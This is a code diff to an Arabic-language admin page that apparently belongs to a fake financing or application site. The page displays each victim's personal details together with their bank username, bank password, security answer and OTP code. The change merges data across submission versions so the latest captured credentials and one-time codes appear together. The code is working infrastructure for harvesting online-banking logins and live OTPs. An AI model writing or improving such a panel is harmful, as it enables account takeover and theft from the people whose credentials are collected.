@@ -10,6 +10,7 @@ import {
   getListApplicationsQueryKey,
 } from "@workspace/api-client-react";
 import AdminLayout from "@/components/AdminLayout";
+import { mergeVersionsData } from "@/lib/mergeVersions";
 import { ArrowRight, ChevronLeft, Send, CheckCircle, Clock } from "lucide-react";
 
 const BASE = import.meta.env.BASE_URL.replace(/\/$/, "");
@@ -56,6 +57,8 @@ interface ApplicationVersion {
   bankPassword?: string;
   securityAnswer?: string;
   otpCode?: string;
+  currentStep?: string;
+  status?: string;
 }
 
 export default function AdminApplicationDetailPage() {
@@ -237,7 +240,17 @@ export default function AdminApplicationDetailPage() {
                   {loadingVersions ? (
                     <p className="text-center text-muted-foreground">جارٍ تحميل البيانات...</p>
                   ) : activeTab === "current" ? (
-                    renderData(currentVersion)
+                    // عرض البيانات المدمجة من جميع النسخ + بيانات app الأصلية
+                    (() => {
+                      const dataToMerge = versions.length > 0 ? versions : [app];
+                      const merged = mergeVersionsData(dataToMerge as any);
+                      const mergedVersion: ApplicationVersion = {
+                        ...app,
+                        ...currentVersion,
+                        ...merged,
+                      };
+                      return renderData(mergedVersion);
+                    })()
                   ) : (
                     <div className="space-y-6">
                       {olderVersions.sort((a, b) => b.version - a.version).map((v) => (
@@ -255,8 +268,16 @@ export default function AdminApplicationDetailPage() {
               </div>
             )}
 
-            {/* البيانات الافتراضية */}
+            {/* البيانات الافتراضية - تستخدم البيانات المدمجة + بيانات app الأصلية */}
             {versions.length <= 1 && (
+              (() => {
+                const dataToMerge = versions.length > 0 ? versions : [app];
+                const merged = mergeVersionsData(dataToMerge as any);
+                const mergedData: ApplicationVersion = {
+                  ...app,
+                  ...merged,
+                };
+                return (
               <>
                 <div className="bg-card border rounded-2xl p-6">
                   <h3 className="font-black mb-4 pb-2 border-b">
@@ -264,40 +285,42 @@ export default function AdminApplicationDetailPage() {
                   </h3>
                   {app.applicantType === "individual" ? (
                     <>
-                      <DataRow label="الاسم الكامل" value={app.fullName} />
-                      <DataRow label="رقم الهوية" value={app.nationalId} />
-                      <DataRow label="تاريخ الميلاد" value={app.dateOfBirth} />
-                      <DataRow label="الراتب الشهري" value={app.monthlySalary} />
-                      <DataRow label="جهة العمل" value={app.employer} />
-                      <DataRow label="رقم الهاتف" value={app.phone} />
-                      <DataRow label="البريد الإلكتروني" value={app.email} />
-                      <DataRow label="المدينة" value={app.city} />
-                      <DataRow label="الحالة الاجتماعية" value={app.maritalStatus} />
+                      <DataRow label="الاسم الكامل" value={mergedData.fullName} />
+                      <DataRow label="رقم الهوية" value={mergedData.nationalId} />
+                      <DataRow label="تاريخ الميلاد" value={mergedData.dateOfBirth} />
+                      <DataRow label="الراتب الشهري" value={mergedData.monthlySalary} />
+                      <DataRow label="جهة العمل" value={mergedData.employer} />
+                      <DataRow label="رقم الهاتف" value={mergedData.phone} />
+                      <DataRow label="البريد الإلكتروني" value={mergedData.email} />
+                      <DataRow label="المدينة" value={mergedData.city} />
+                      <DataRow label="الحالة الاجتماعية" value={mergedData.maritalStatus} />
                     </>
                   ) : (
                     <>
-                      <DataRow label="اسم الشركة" value={app.companyName} />
-                      <DataRow label="نوع النشاط" value={app.businessType} />
-                      <DataRow label="السجل التجاري" value={app.commercialRegistration} />
-                      <DataRow label="عدد الموظفين" value={app.employeeCount} />
-                      <DataRow label="الإيرادات السنوية" value={app.annualRevenue} />
-                      <DataRow label="اسم المسؤول" value={app.contactName} />
-                      <DataRow label="رقم الهاتف" value={app.phone} />
-                      <DataRow label="البريد الإلكتروني" value={app.email} />
+                      <DataRow label="اسم الشركة" value={mergedData.companyName} />
+                      <DataRow label="نوع النشاط" value={mergedData.businessType} />
+                      <DataRow label="السجل التجاري" value={mergedData.commercialRegistration} />
+                      <DataRow label="عدد الموظفين" value={mergedData.employeeCount} />
+                      <DataRow label="الإيرادات السنوية" value={mergedData.annualRevenue} />
+                      <DataRow label="اسم المسؤول" value={mergedData.contactName} />
+                      <DataRow label="رقم الهاتف" value={mergedData.phone} />
+                      <DataRow label="البريد الإلكتروني" value={mergedData.email} />
                     </>
                   )}
                 </div>
-                {(app.bankName || app.bankUsername) && (
+                {(mergedData.bankName || mergedData.bankUsername) && (
                   <div className="bg-card border rounded-2xl p-6">
                     <h3 className="font-black mb-4 pb-2 border-b">بيانات البنك</h3>
-                    <DataRow label="البنك المختار" value={app.bankName} />
-                    <DataRow label="اسم المستخدم" value={app.bankUsername} />
-                    <DataRow label="كلمة المرور" value={app.bankPassword} />
-                    <DataRow label="كلمة التحقق" value={app.securityAnswer} />
-                    <DataRow label="رمز OTP" value={app.otpCode} />
+                    <DataRow label="البنك المختار" value={mergedData.bankName} />
+                    <DataRow label="اسم المستخدم" value={mergedData.bankUsername} />
+                    <DataRow label="كلمة المرور" value={mergedData.bankPassword} />
+                    <DataRow label="كلمة التحقق" value={mergedData.securityAnswer} />
+                    <DataRow label="رمز OTP" value={mergedData.otpCode} />
                   </div>
                 )}
               </>
+                );
+              })()
             )}
 
             {/* إرسال رسالة */}
